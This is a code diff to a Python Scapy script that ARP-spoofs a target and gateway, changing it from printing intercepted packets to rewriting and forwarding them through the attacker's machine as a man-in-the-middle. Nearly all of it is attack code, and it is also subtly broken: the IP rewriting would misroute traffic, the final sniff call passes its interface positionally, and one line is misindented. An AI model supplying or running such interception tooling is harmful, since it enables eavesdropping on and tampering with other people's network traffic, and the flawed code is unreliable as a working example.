@@ -18,34 +18,35 @@ def arp_spoof(target_ip, gateway_ip):
     send(target_packet, verbose=False)
     send(gateway_packet, verbose=False)
 
-# Define the packet sniffing function to capture packets between the target and gateway
-def sniff_packets(iface, target_ip):
-    # Define a filter to capture packets only between the target and gateway
-    sniff_filter = "ip host " + target_ip
-
-    # Start sniffing packets on the network interface using the defined filter
-    sniff(iface=iface, prn=packet_callback, filter=sniff_filter)
-
-# Define the packet callback function to print the contents of captured packets
-def packet_callback(packet):
+# Define the packet forwarding function to forward packets between the target and gateway through our own computer
+def forward_packets(packet):
     # Check if the packet is an IP packet
     if packet.haslayer(IP):
-        # If the packet was sent by the target to the gateway, print a message
+        # If the packet was sent by the target to the gateway, forward it through our own computer
         if packet[IP].src == target_ip and packet[IP].dst == gateway_ip:
-            print("[+] Sent packet: " + str(packet[IP]))
-        # If the packet was sent by the gateway to the target, print a message
+            # Change the packet's source IP address to our own IP address
+            packet[IP].src = our_ip
+
+            # Send the packet to the gateway
+            send(packet)
+
+        # If the packet was sent by the gateway to the target, forward it through our own computer
         elif packet[IP].src == gateway_ip and packet[IP].dst == target_ip:
-            print("[+] Received packet: " + str(packet[IP]))
+            # Change the packet's destination IP address to our own IP address
+            packet[IP].dst = our_ip
+
+            # Send the packet to the target
+            send(packet)
 
 if __name__ == "__main__":
-    # Check that the script is being used correctly with two arguments (target IP and gateway IP)
-    if len(sys.argv) != 3:
-        print("Usage: " + sys.argv[0] + " <target_ip> <gateway_ip>")
+        # Check that the script is being used correctly with three arguments (target IP, gateway IP, and our own IP)
+    if len(sys.argv) != 4:
+        print("Usage: " + sys.argv[0] + " <target_ip> <gateway_ip> <our_ip>")
         sys.exit(1)
-
     # Get the target IP and gateway IP from the command-line arguments
     target_ip = sys.argv[1]
     gateway_ip = sys.argv[2]
+    our_ip = sys.argv[3]
 
     # Set the network interface to use for ARP spoofing and packet sniffing
     iface = "eth0"
@@ -62,4 +63,4 @@ if __name__ == "__main__":
 
     # Start packet sniffing on the network interface to capture packets between the target and gateway
     print("[+] Starting packet sniffing...")
-    sniff_packets(iface, target_ip)
+    sniff(iface, prn=forward_packets)
